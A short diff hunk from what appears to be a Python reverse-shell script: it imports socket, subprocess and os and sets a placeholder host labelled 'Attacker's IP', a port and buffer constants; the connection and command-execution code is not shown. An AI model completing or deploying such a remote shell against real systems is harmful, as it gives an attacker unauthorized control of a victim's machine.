@@ -2,7 +2,7 @@ import socket
 import subprocess
 import os
 
-HOST = "000.000.000.000"
+HOST = "000.000.000.000" # Attacker's IP
 PORT = 1234
 BUFFER = 4096
 SEP = "<sep>"
